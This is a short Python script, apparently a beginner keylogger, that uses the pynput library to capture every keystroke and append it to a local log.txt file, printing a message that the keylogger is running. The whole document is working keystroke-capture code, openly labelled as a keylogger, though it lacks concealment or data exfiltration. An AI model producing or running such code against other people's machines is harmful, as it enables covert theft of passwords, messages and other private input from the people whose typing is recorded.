from pynput.keyboard import Listener

#function to log keystrokes
def log_keystrokes(key):
    key = str(key).replace("'","")
    with open("log.txt", "a") as log_file:
        log_file.write(key)

#start listening to keystrokes
def start_logging():
    with Listener (on_press=log_keystrokes) as listener:
        listener.join()

if __name__ == "__main__":
    print("[+]Keylogger is running...(print CTRL + C to stop)")
    start_logging()